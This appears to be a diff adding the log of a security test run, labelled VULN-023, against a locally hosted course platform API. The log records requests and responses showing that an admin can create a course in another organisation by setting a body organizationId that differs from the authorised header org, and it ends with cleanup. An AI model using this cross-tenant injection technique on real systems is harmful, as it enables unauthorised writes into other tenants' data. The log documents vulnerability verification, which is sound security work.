@@ -1,0 +1,19 @@
+========================================================================
+VULN-023: POST /course writes body organizationId (cross-tenant course injection)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[SETUP] admin authorized in header org 48bbdff8-2ad5-46a3-a259-2ca3d52677dd; orgRoles={'48bbdff8-2ad5-46a3-a259-2ca3d52677dd': 1}
+[SETUP] found FOREIGN org f0259e1a-b93d-4f0a-ae75-1939a177e583; admin membership rows there = 0 (0 == not a member)
+[STEP] Test A: POST /course  header cio-org-id=48bbdff8..  body organizationId=eb5060ae-5a3a-46c7-95b0-f1d12b3fe754 (bogus)
+[INFO]   -> HTTP 500  {"success":false,"error":"Failed to create course","code":"INTERNAL_ERROR"}
+[PROOF] body organizationId != header org was NOT rejected by zod(400)/authz(403); it reached the DB (HTTP 500) — only the FK to organization.id stops a bogus id
+[STEP] contrast: POST /course with HEADER cio-org-id=eb5060ae-5a3a-46c7-95b0-f1d12b3fe754 (not my org) → expect 403
+[INFO]   -> HTTP 403  {"success":false,"error":"Only organization admins can perform this action","code":"ORG_TEAM_NOT_AUTHORIZED"}
+[STEP] Test B: POST /course  header cio-org-id=48bbdff8..  body organizationId=f0259e1a-b93d-4f0a-ae75-1939a177e583 (FOREIGN)
+[INFO]   -> HTTP 201  {"success":true,"data":{"course":{"title":"inj-c_4df43c09","description":"cross-tenant inject probe","overview":"Welcome to this amazing course 🚀 ","id":"41c48373-e0a7-4964-9dad-79bd00dd4b3d","created
+[INFO]   injected group 265a4eb7-979a-4087-9308-ae2c185941ef organization_id = 'f0259e1a-b93d-4f0a-ae75-1939a177e583' (victim=f0259e1a-b93d-4f0a-ae75-1939a177e583)
+[PROOF] a course+group the admin created landed in FOREIGN org f0259e1a-b93d-4f0a-ae75-1939a177e583, which the admin is NOT a member of → live cross-tenant course injection (authz on header 48bbdff8.., write into body org)
+[STEP] cleanup: deleting the injected course/group from the foreign org
+[INFO]   post-cleanup group rows for injected id = 0
+==> VULN-023: CONFIRMED — admin of 48bbdff8.. injected a course into FOREIGN org f0259e1a.. via body organizationId (authz is header-only); injected rows cleaned up
+[OK] live cross-tenant course injection confirmed
